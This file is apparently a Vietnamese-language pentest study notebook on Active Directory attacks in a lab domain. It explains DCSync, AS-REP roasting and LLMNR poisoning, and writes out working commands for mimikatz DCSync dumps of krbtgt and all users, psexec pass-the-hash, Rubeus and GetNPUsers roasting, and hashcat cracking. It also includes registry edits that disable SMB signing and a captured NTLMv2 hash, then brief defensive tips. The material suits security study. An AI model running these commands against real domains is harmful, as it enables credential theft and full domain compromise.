@@ -1,0 +1,180 @@
+một active directory chứa nhiều DC (domain controller), các dc này sẽ chứa bản copy của Active Directory database là ntds.dit. Khi một dc có một sự thay đổi (ví dụ dc1 thêm một user vào domain) thì các dc còn lại sẽ thực hiện request để yêu cầu replication, vậy kết quả lúc này sẽ là gì?
+và tấn công dcsync nó tận dụng điều gì?
+
+Luồng bình thường: khi dc1 thực hiện thay đổi, nó sẽ thay đổi vào database cục bộ của nó, sau đó nó thực hiện tăng USN (Update Sequence Number) để đánh dấu thay đổi, sau đó nó sẽ thực hiện gửi thông báo đến các dc khác rằng nó có một sự cập nhật mới, các dc còn lại sẽ không nhận toàn bộ DB từ dc1 mà nó sẽ yêu cầu thông tin mọi thay đổi sau USN x (chính là số mà nó đã được update gần nhất), lúc này các dc còn lại sẽ được nhận đúng các thay đổi từ USN x trở về sau và ghi các thay đổi đó vào database.
+DCSync attack: nó sẽ thực hiện giả dạng rằng nó là một DC hợp lệ và yêu cầu DC1 hoặc các DC trong active directory gửi cho nó tất cả thông tin password data để nó replication
+
+
+
+13. Mimikatz DCSync làm gì?
+
+Lệnh:
+
+lsadump::dcsync
+
+sẽ:
+
+bind tới DRSUAPI RPC
+authenticate
+gọi replication APIs
+request object secrets
+
+permission:
+replication service
+DS-Replication-Get-Changes
+DS-Replication-Get-Changes-All (quan trọng nhất)
+Thường cần thêm DS-Replication-Get-Changes-In-Filtered-Set (tùy trường hợp).
+
+
+Replication = cơ chế đồng bộ dữ liệu giữa các Domain Controller (DC)
+
+
+
+
+Administrator
+789492fb036fdbf79a773d62ac043dce
+
+impacket-psexec -hashes :789492fb036fdbf79a773d62ac043dce administrator@192.168.119.2
+
+privilege::debug
+lsadump::dcsync /domain:pentest.local /user:Administrator
+lsadump::dcsync /domain:pentest.local /all
+-> lấy được hash ntlm của krbtgt
+lsadump::dcsync /domain:pentest.local /user:krbtgt
+
+
+* AS-REP Roasting
+Nó là kỹ thuật tấn công vào các tài khoản có cài đặt không yêu cầu Pre-Authentication (thuộc tính "Do not require Kerberos preauthentication" được bật)
+Pre-Authentication là một cơ chế bảo vệ, client phải chứng minh được nó biết password của user, KDC sẽ thực hiện kiểm tra rồi xác định có nên cấp Ticket cho client không.
+Cuộc tấn công này nhằm vào các user không yêu cầu Pre-Authentication, lúc này Attacker gửi AS-REQ đến KDC, giả danh user (không cần cấp password), KDC kiểm tra thấy user có thuộc tính không cần Pre-Authentication thì trả về AS-REP ngay lập tức mà không cần kiểm tra, trong AS-REP nó chứa Ticket Granting Ticket (TGT) -> Attacker có được TGT và sau đó có thể thực hiện crack ra để lấy được password hash hoặc các thông tin khác.
+
+Rubeus.exe asreproast /domain:pentest.local /dc:192.168.119.2 /format:hashcat /outfile:asrep_hashes.txt
+-> liệt kê ra các user đang có thuộc tính không cần pre-authentication trong domain và cho ra file 
+hashcat -m 18200 asrep_hashes.txt rockyou.txt -w 3 --force
+
+impacket-GetNPUsers pentest.local/Administrator:admin@123! \        
+    -dc-ip 192.168.119.2 \
+    -request \
+    -format hashcat \
+    -outputfile asrep_hashes_kali.txt
+-> Chỉ cần một user bình thường để thực hiện việc bind vào ldap để quét để tìm các user có thuộc tính dính lỗi do không cần pre-authentication
+
+** Quy trình xác thực cơ bản cần nắm nhanh trong kerberos liên quan
+AS-REQ (Authentication Service Request): Client gửi yêu cầu đến KDC (Key Distribution Center – thường là Domain Controller).
+AS-REP (Authentication Service Reply): KDC trả về Ticket Granting Ticket (TGT) cho client.
+
+
+
+
+* preference: https://medium.com/@hyphens443/attacking-domain-controllers-a45b9cb9651c
+
+
+
+
+*****************************************
+Tất cả kiểu tấn công trong môi trường active directory
+
+
+
+- ntlm relay
+- tận dụng nâng quyền để thực hiện dumping info credential
+
+
+
+
+
+ntds.dit là cơ sở dữ liệu chính của Active Directory trên Domain Controller. Nó chứa: User accounts, Computer accounts, Group memberships, Chính sách AD, Password hash của toàn bộ domain
+
+Nó nằm ở C:\Windows\NTDS\ntds.dit
+Nếu có được registry SYSTEM hive và file này thì có thể giải mã lấy được toàn bộ thông tin của domain
+
+
+
+
+* DCSync attack
+DCSync là một kỹ thuật tấn công credential dumping cực kỳ mạnh trong Active Directory. Nó cho phép attacker giả lập một Domain Controller (DC) để yêu cầu replicate (đồng bộ) dữ liệu nhạy cảm từ DC thật, thu thập NTLM hashes (và cả Kerberos keys) của toàn bộ users, đặc biệt là krbtgt (dùng để forge Golden Ticket).
+
+Active Directory sử dụng giao thức MS-DRSR (Directory Replication Service Remote Protocol) để các Domain Controllers đồng bộ dữ liệu với nhau. DC sử dụng hàm DsGetNCChanges để pull thay đổi từ DC khác.
+DCSync lạm dụng chính xác cơ chế hợp pháp này:
+Attacker không cần dump file NTDS.dit trực tiếp trên DC.
+Attacker gửi RPC call đến DC, giả lập là một DC khác đang yêu cầu replicate.
+DC sẽ trả về password data (hashes) cho các object được yêu cầu.
+
+
+
+
+
+
+
+
+
+***********************************
+responder -I eth1
+
+
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 0 /f
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 0 /f
+
+
+parameter của workstation có enable là 1 và require mặc định là 0
+
+Mặc dù disable hết tất cả rồi mà vẫn không thấy nó bắt được poisoning
+
+
+setspn -a DC2012/SQLService.pentest.local:60111 PENTEST\SQLService
+Thêm một SPN (Service Principal Name) cho tài khoản domain PENTEST\SQLService, với SPN là DC2012\SQLService.pentest.local:60111
+"Service MSSQL tại host DC2012.pentest.local, port 60111, chạy dưới account PENTEST\SQLService"
+Kerberos sẽ dùng SPN để biết Khi ai đó request ticket cho MSSQLSvc/DC2012.pentest.local:60111 thì ticket phải được mã hóa bằng secret của account PENTEST\SQLService
+-> Đăng ký service SQL trên DC2012.pentest.local:60111 cho account PENTEST\SQLService để Kerberos cấp service ticket đúng account
+
+
+setspn -T pentest.local -Q */*
+setspn -T pentest.local -Q DC2016/SQLService.pentest.local:60111
+-> Câu lệnh để truy vấn SPN
+
+
+setspn -D DC2012/SQLService.pentest.local:60111 "SQLService"
+-> Câu lệnh xóa SPN: "SQLService" chính là account
+
+
+* fix
+Thực hiện connect trực tiếp tới IP của máy kali đang chạy responder thì sẽ nhận được thông tin hash
+\\192.168.119.40
+Thông thường sẽ nhận được dạng NTLMv2 hash
+administrator::PENTEST:aca911dae8f4ef97:4E69ACE97F2F0B2B8DAB0A106DDD2390:01010000000000000051B36ECAD4DC01065DF6AA484CBAA200000000020008004C004A004E00500001001E00570049004E002D004F00440043003800490058005000560036003900330004003400570049004E002D004F0044004300380049005800500056003600390033002E004C004A004E0050002E004C004F00430041004C00030014004C004A004E0050002E004C004F00430041004C00050014004C004A004E0050002E004C004F00430041004C00070008000051B36ECAD4DC010600040002000000080030003000000000000000010000000020000029D30BCF40E44EF19F7B63C28757517BF8951D16E49E197E3D2094C57C7F69C70A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310039002E00340030000000000000000000
+
+gedit ntlmhash.txt
+hashcat -m 5600 ntlmhash.txt rockyou.txt --force
+
+Hướng dẫn defen LLMNR poisoning
+disable lmnr và mbtns
+làm mật khẩu trở nên khó hơn
+kiểm soát nghiêm ngặt setting network accecss
+
+
+
+* discovering hosts with smb signing disabled
+nmap --script=smb2-security-mode.nse -p445 192.168.119.0/24
+
+
+
+as-reg
+TGS-REg
+
+
+TGT encrypted with krbtgt password, data encrypted with session key
+
+GetNPUsers
+
+
+
+
+
+
+
+
+
